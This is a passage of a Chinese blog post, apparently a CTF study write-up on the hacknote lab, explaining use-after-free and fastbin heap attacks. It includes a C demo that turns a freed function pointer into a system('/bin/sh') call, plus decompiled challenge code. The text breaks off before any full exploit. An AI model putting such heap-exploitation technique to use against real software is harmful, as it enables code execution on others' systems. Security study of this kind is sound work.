<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html>
  <head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  
  
  <title>  Pwn-11æœˆ02-Hitcon-å…­ |   Xiaoyifeng&#39;s blog </title>

 
  
    <link rel="icon" href="/images/favicon.png">
  


  <link rel="stylesheet" href="/nayo.min.css"> 
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>  
  <body>   
    
      <header class="header">
	
  <nav class="header-inner">        

    <span class="iconfont icon-menu mobile-toggle"></span>   	

    <div class="header-logo">
      <a href="/">
        <img class="header-logo-img" src="/images/logo.png">
      </a>
    </div>

    <div class="header-menu">          
              
          
            <a class="header-menu-link" id="header-menu-home" href="/">
              <i class="iconfont icon-home">  
            </i></a>     
          
              
          
            <a class="header-menu-link" id="header-menu-archives" href="/archives">
              <i class="iconfont icon-archives">  
            </i></a>     
          
              
          
            <a class="header-menu-link" id="header-menu-tags" href="/tags">
              <i class="iconfont icon-tags">  
            </i></a>     
          
              
          
            <a class="header-menu-link" id="header-menu-about" href="/about">
              <i class="iconfont icon-about">  
            </i></a>     
          
              
          
              <a class="header-menu-link" id="header-menu-search">
                <i class="iconfont icon-search">  
              </i></a>
          
                  
    </div>  
    
  </nav>
</header>

   

      <div class="container">       
          
          
            <div class="container-inner">  
          

          <article class="post">
  
	
<div class="post-header">
	<div class="post-header-inner">
		<p class="post-title">	
			Pwn-11æœˆ02-Hitcon-å…­
		</p>
		<div class="post-info">	
			<span class="post-info-entry">
				11æœˆ 02, 2018
			</span>

			
			
				<i class="iconfont icon-words"></i>
				<span class="post-info-entry">6995
				</span>
			
		</div>
	</div>
</div> 
	
 

	  <div class="typo post-content slideDownMin">

		

			
					<p>â€¦â€¦</p>
<a id="more"></a>
<h1 id="Pwn-11æœˆ02-Hitcon-å…­"><a href="#Pwn-11æœˆ02-Hitcon-å…­" class="headerlink" title="Pwn-11æœˆ02-Hitcon-å…­"></a>Pwn-11æœˆ02-Hitcon-å…­</h1><blockquote>
<p>è¿›åº¦è¿˜æ˜¯å¤ªæ…¢äº†ï¼Œä¸èƒ½å†å¢¨è¿¹ä¸‹å»äº†ğŸ’ªï¼ï¼</p>
</blockquote>
<h2 id="lab10-hacknote"><a href="#lab10-hacknote" class="headerlink" title="lab10-hacknote"></a>lab10-hacknote</h2><blockquote>
<p>&nbsp; &nbsp; &nbsp; &nbsp; è¿™æ˜¯ä¸€é“ fastbin uafåˆ©ç”¨ï¼Ÿfastbinæ˜¯ä»€ä¹ˆï¼Ÿuafåˆæ˜¯ä»€ä¹ˆï¼Ÿåˆæ˜¯ä¸€é“æ¶¨å§¿åŠ¿çš„é¢˜å‘¢ã€‚å•Šå•Šå•Šä»è¿™å„¿å¼€å§‹å°±æ¥è§¦å †è¿™ç©æ„å„¿äº†ï¼ï¼ï¼</p>
<p><a href="https://www.sohu.com/a/239388523_354899" target="_blank" rel="noopener">å †æº¢å‡ºå­¦ä¹ ä¹‹è·¯</a></p>
</blockquote>
<h3 id="UAF-use-after-free"><a href="#UAF-use-after-free" class="headerlink" title="UAF (use after free)"></a>UAF (use after free)</h3><blockquote>
<p>&nbsp; &nbsp; &nbsp; &nbsp; Use after freeï¼Œè·Ÿå­—é¢ä¸Šçš„æ„æ€ä¸€æ ·ï¼šç¬¬ä¸€æ¬¡ç”³è¯·çš„å†…å­˜ç©ºé—´åœ¨é‡Šæ”¾è¿‡åæ²¡æœ‰è¿›è¡Œå†…å­˜å›æ”¶ï¼Œå¯¼è‡´ä¸‹æ¬¡ç”³è¯·å†…å­˜çš„æ—¶å€™å†æ¬¡ä½¿ç”¨è¯¥å†…å­˜å—ï¼Œä½¿å¾—ä»¥å‰çš„å†…å­˜æŒ‡é’ˆå¯ä»¥è®¿é—®ä¿®æ”¹è¿‡çš„å†…å­˜ã€‚</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; é‚£é€šè¿‡UAFæ¼æ´ï¼Œæˆ‘ä»¬èƒ½å¹²å˜›ï¼Œå½“ç„¶æ˜¯ç›´æ¥getshellï¼Œé€šè¿‡ä¸‹é¢ä¸€æ®µcç¨‹åºï¼Œè¿›è¡Œç¼–è¯‘å°±èƒ½getshelläº†ï¼ˆç¨‹åºä»£ç æ¥è‡ª<a href="https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1" target="_blank" rel="noopener">4ct10nçš„åšå®¢</a> ï¼‰ï¼š</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>func_ptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">evil_fuc</span><span class="token punctuation">(</span><span class="token keyword">char</span> command<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token function">system</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token keyword">char</span> content<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    func_ptr <span class="token operator">*</span>p1<span class="token operator">=</span><span class="token punctuation">(</span>func_ptr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>echo<span class="token punctuation">;</span>
    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"hello world\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//åœ¨è¿™é‡Œfreeäº†p1,ä½†å¹¶æœªå°†p1ç½®ç©º,å¯¼è‡´åç»­å¯ä»¥å†ä½¿ç”¨p1æŒ‡é’ˆ</span>
    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"hello again\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//p1æŒ‡é’ˆæœªè¢«ç½®ç©º,è™½ç„¶freeäº†,ä½†ä»å¯ä½¿ç”¨.</span>
    func_ptr <span class="token operator">*</span>p2<span class="token operator">=</span><span class="token punctuation">(</span>func_ptr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//mallocåœ¨freeä¸€å—å†…å­˜å,å†æ¬¡ç”³è¯·åŒæ ·å¤§å°çš„æŒ‡é’ˆä¼šæŠŠåˆšåˆšé‡Šæ”¾çš„å†…å­˜åˆ†é…å‡ºæ¥.</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//p2ä¸p1æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä¸ºåŒä¸€åœ°å€</span>
    p2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>evil_fuc<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//åœ¨è¿™é‡Œå°†p1æŒ‡é’ˆé‡Œé¢ä¿å­˜çš„echoå‡½æ•°æŒ‡é’ˆè¦†ç›–æˆä¸ºäº†evil_funcæŒ‡é’ˆ.</span>
    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre>
<p>ç¼–è¯‘è¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2018/11/02/5bdbf64c0bcc4.png" alt=""></p>
</blockquote>
<h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><blockquote>
<p><a href="https://github.com/bash-c/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf" target="_blank" rel="noopener">fast binå‚è€ƒPDF</a></p>
<p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102194003.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102194047.png" alt=""></p>
<p>fastbin attack é€šå¸¸ä¸å †å—è”ç³»åœ¨ä¸€èµ·ï¼Œæ˜¯CTFä¸­å¸¸è§é¢˜å‹ã€‚</p>
<p>å®šä¹‰å¦‚ä¸‹ï¼š</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; Fastbin Attackæ˜¯fastbinåœ¨å­˜å‚¨ç®¡ç†æ—¶ï¼Œä¸ºä¿è¯å¿«é€Ÿåˆ†é…ï¼Œå›æ”¶å†…å­˜çš„éœ€è¦ï¼Œåœ¨å†…å­˜ç®¡ç†çš„æœºåˆ¶ä¸­å‡ºç°çš„é—®é¢˜ï¼Œè¿›è€Œé€ æˆçš„æ¼æ´ï¼Œèƒ½å¤Ÿé€šè¿‡æ¼æ´æ”¹å†™main_arenaä¸Šçš„FasbinYæŒ‡é’ˆæ•°ç»„ï¼Œä»è€Œè·å¾—â€œç‰¹å®šâ€ï¼ˆéœ€è¦æ»¡è¶³ä¸€å®šæ¡ä»¶ï¼‰åœ°å€çš„å†™æƒé™ã€‚</p>
<p>è‡³äºmain_arenaï¼Œå°±å¼•ç”¨ä¸€ä¸‹stackoverflowçš„è§£é‡Šå’¯ï¼š</p>
<p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102215928.png" alt=""></p>
<p><code>main_arena</code> is a local symbol and is specifically <strong>not exported</strong>. the list of exported symbols is controlled via the <code>Version</code> files in the glibc source tree. this is, by design, to keep people from being able to link against random symbols that glibc uses internally (so as to not pollute the namespace as is required by POSIX and other standards).</p>
<blockquote>
<p>main_arenaæ˜¯ä¸èƒ½å¯¼å‡ºçš„ä¸€ä¸ªæœ¬åœ°ç¬¦å·è¡¨ã€‚å¯¼å‡ºç¬¦å·åˆ—è¡¨éœ€è¦é€šè¿‡glibcæºä»£ç ç›®å½•ä¸­çš„Versionæ–‡ä»¶æ§åˆ¶ã€‚è¿™æ˜¯è®¾è®¡ç”¨äºé˜²æ­¢äººä»¬é“¾æ¥glibcå†…éƒ¨ä½¿ç”¨çš„éšæœºç¬¦å·ï¼Œï¼ˆæ‰€ä»¥ä¸ä¼šåƒPOSIXå’Œå…¶ä»–æ ‡å‡†é‚£æ ·æ±¡æŸ“å‘½åç©ºé—´ï¼‰ã€‚</p>
</blockquote>
<p>gdb can find it because you have debug symbols available â€¦ either the C lib is not stripped, or you have the split debug symbols in <code>/usr/lib/debug/</code> and gdb is finding those. when you launch gdb, it will tell you things like <code>Reading symbols from /usr/lib/debug/xxxxx</code>.</p>
<blockquote>
<p>gdbå¯ä»¥æ‰¾åˆ°main_arenaï¼Œå› ä¸ºä½ å¯ä»¥è·å¾—ä¸€äº›è°ƒè¯•ç¬¦å·è¡¨â€¦å½“ç¨‹åºæ²¡æœ‰è¢«è„±è¡£æœ(not stripped)ï¼Œæˆ–è€…ä½ åœ¨<code>/ usr / lib / debug /</code>ä¸­æ‹†åˆ†è¿‡è°ƒè¯•ç¬¦å·ï¼Œè€Œgdbå¯ä»¥æ‰¾åˆ°å®ƒä»¬ã€‚å½“ä½ å¯åŠ¨gdbè¿›è¡Œè°ƒè¯•æ—¶ï¼Œå®ƒä¼šæ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯ï¼Œä¾‹å¦‚<code>loading symbols from / usr / lib / debug / xxxxx</code>è¿™ç§è°ƒè¯•ä¿¡æ¯ã€‚</p>
</blockquote>
<p>the only way to be able to link against the symbol is to rebuild glibc from source and modify the export list.</p>
<blockquote>
<p>å”¯ä¸€èƒ½å¤Ÿé“¾æ¥åˆ°ç¬¦å·çš„æ–¹æ³•æ˜¯ä»æºé‡æ„GLIBCå¹¶ä¿®æ”¹å¯¼å‡ºåˆ—è¡¨ã€‚</p>
</blockquote>
<p>alternatively, you could write some code in your app to behave like gdb. namely, open the debug file, process the ELF/DWARF information in it, apply relocations using the active loaded library info (see <code>dl_iterate_phdr</code>), and then just start poking memory directly.</p>
<blockquote>
<p>æˆ–è€…ï¼Œä½ å¯ä»¥åœ¨ä½ çš„åº”ç”¨ç¨‹åºä¸­ç¼–å†™ä¸€äº›ä»£ç æ¥åƒgdbè°ƒè¯•ä¸€æ ·ã€‚å³é€šè¿‡åº”ç”¨ç¨‹åºï¼Œæ‰“å¼€è°ƒè¯•æ–‡ä»¶ï¼Œå¤„ç†å…¶ä¸­çš„ELF / DWARFä¿¡æ¯ï¼Œä½¿ç”¨æ´»åŠ¨åŠ è½½çš„åº“ä¿¡æ¯åº”ç”¨é‡å®šä½ï¼ˆè¯·å‚é˜…dl_iterate_phdrï¼‰ï¼Œç„¶åç›´æ¥å¼€å§‹è°ƒç”¨å†…å­˜ã€‚</p>
</blockquote>
<p>if thatâ€™s too much work, a hackery solution might be to <code>fork()</code>+<code>popen()</code> gdb against your own process and run it in batch mode to dump symbol info.</p>
<blockquote>
<p>å¦‚æœé‚£å¤ªè¿‡äºéº»çƒ¦ï¼Œé»‘å®¢ä¸€ç‚¹çš„è§£å†³æ–¹æ¡ˆå¯èƒ½æ˜¯<code>forkï¼ˆï¼‰+ popenï¼ˆï¼‰</code>gdbè°ƒè¯•ä½ è‡ªå·±çš„è¿›ç¨‹ï¼Œå¹¶ä»¥æ‰¹å¤„ç†æ¨¡å¼è¿è¡Œå®ƒæ¥è½¬å‚¨ç¬¦å·ä¿¡æ¯ã€‚</p>
</blockquote>
<pre class=" language-c"><code class="language-c">
<span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">;</span>
FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>

<span class="token function">asprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cmd<span class="token punctuation">,</span> <span class="token string">"gdb -q -p %i -batch -ex 'p &amp;main_arena'"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
fp <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// parse the output of |fp| here looking for the address.</span>

<span class="token function">free</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
</blockquote>
<h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote>
<p>é‚£ä¹ˆå¼€å§‹åšé¢˜å§ï¼Œå…ˆchecksec:</p>
<p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102203217.png" class="lazyload"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œå¼€å¯äº†æ ˆæº¢å‡ºä¿æŠ¤ä»¥åŠæ ˆä¸å¯æ‰§è¡Œï¼Œé‚£ä¹ˆè¿™é¢˜å¾ˆæ˜æ˜¾å°±æ˜¯è®©æˆ‘ä»¬ä»åˆ«çš„åœ°æ–¹å…¥æ‰‹ã€‚</p>
</blockquote>
<h3 id="é€»è¾‘åˆ†æ"><a href="#é€»è¾‘åˆ†æ" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote>
<p>å…ˆç®€å•è¿è¡Œä¸€ä¸‹ç¨‹åºï¼š</p>
<p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102203545.png" class="lazyload"></p>
<p>è¿™ç§noteç±»é¢˜ç›®å¯ä»¥è¯´æ˜¯æ¯”è¾ƒå¸¸è§äº†ã€‚ã€‚ã€‚å³ä½¿æˆ‘ä¸æ˜¯pwnå¸ˆå‚…ï¼Œæˆ‘ä¹Ÿé‡åˆ°è¿‡å¾ˆå¤šæ¬¡ï¼Œå½“ç„¶æ˜¯ä¸€è„¸æ‡µé€¼äº†ï¼ŒğŸ˜­ã€‚</p>
</blockquote>
<p>é€šè¿‡IDAé™æ€åˆ†æmainå‡½æ•°ï¼Œå¯ä»¥å¾—åˆ°ä¸‹é¢çš„ä¼ªCä»£ç ï¼š</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//mainå‡½æ•°</span>
<span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>

  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">//èœå•</span>
      <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      v3 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token function">del_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//åˆ é™¤æŒ‡å®šå¯¹è±¡</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        <span class="token function">print_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//æ‰“å°å¯¹è±¡</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span>
      <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span>
          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
LABEL_13<span class="token punctuation">:</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
        <span class="token keyword">goto</span> LABEL_13<span class="token punctuation">;</span>
      <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//æ·»åŠ note</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>çœ‹çœ‹addå‡½æ•°ï¼š</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//add_note</span>
<span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  _DWORD <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>
  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-1Ch]</span>
  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-18h]</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-14h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-Ch]</span>

  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> count <span class="token operator">&lt;=</span> <span class="token number">5</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//å…ˆä¸ºnotelistç”³è¯·8å¤§å°çš„ç©ºé—´</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> print_note_content<span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Note size :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        size <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v0 <span class="token operator">=</span> notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        v0<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//å†ä¸ºè¾“å…¥çš„å†…å®¹ï¼ˆcontentï¼‰ç”³è¯·ç©ºé—´</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è¯»å–å†…å®¹</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">++</span>count<span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>deleteå‡½æ•°:</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">del_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
